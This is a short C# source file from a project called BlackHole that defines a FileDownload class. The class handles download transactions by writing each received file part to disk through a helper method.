using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Master.Model
{
    /// <summary>
    /// 
    /// </summary>
    public sealed class FileDownload : FileTransaction
    {
        /// <summary>
        /// 
        /// </summary>
        /// <param name="id"></param>
        public FileDownload() : base(TransactionType.DOWNLOAD)
        {            
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="part"></param>
        protected override void InternalUpdate(DownloadedFilePartMessage downloadedPart) 
            => CommonHelper.WriteDownloadedPart(downloadedPart);
    }
}
